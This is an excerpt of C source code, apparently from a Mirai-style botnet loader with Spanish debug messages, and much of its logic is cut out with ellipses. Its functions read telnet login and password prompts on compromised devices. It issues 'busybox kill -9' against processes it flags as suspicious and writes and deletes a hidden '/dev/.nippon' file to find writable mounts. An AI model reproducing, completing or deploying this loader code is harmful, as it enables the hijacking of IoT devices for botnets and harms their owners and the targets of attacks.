...
int connection_consume_login_prompt(struct connection *conn)
{
    ...
    for (i = conn->rdbuf_pos; i >= 0; i--)
    {
        ...
        {
#ifdef DEBUG
            printf("coincide con login prompt en %d, \"%c\", \"%s\"\n", i, conn->rdbuf[i], conn->rdbuf);
#endif
            prompt_ending = i;
            break;
        }
...
int connection_consume_password_prompt(struct connection *conn)
{
    ...
    for (i = conn->rdbuf_pos; i >= 0; i--)
    {
        ...
        {
#ifdef DEBUG
            printf("coincide password prompt en %d, \"%c\", \"%s\"\n", i, conn->rdbuf[i], conn->rdbuf);
#endif
            prompt_ending = i;
            break;
        }
...
int connection_consume_prompt(struct connection *conn)
{
    ...
    for (i = conn->rdbuf_pos; i >= 0; i--)
    {
        ...
        {
#ifdef DEBUG
            printf("coincide any prompt en %d, \"%c\", \"%s\"\n", i, conn->rdbuf[i], conn->rdbuf);
#endif
            prompt_ending = i;
            break;
        }
...
#ifdef DEBUG
                        printf("Matando proceso sospechoso (pid=%d, name=%s)\n", pid, proc_name);
#endif
                        util_sockprintf(conn->fd, "/bin/busybox kill -9 %d\r\n", pid);
                    }
                }
...
int connection_consume_mounts(struct connection *conn)
{
    ...
    util_sockprintf(conn->fd, "sudo su; /bin/busybox echo -e '%s/dev' > /dev/.nippon; /bin/busybox cat /dev/.nippon; /bin/busybox rm /dev/.nippon\r\n",
                    VERIFY_STRING_HEX);
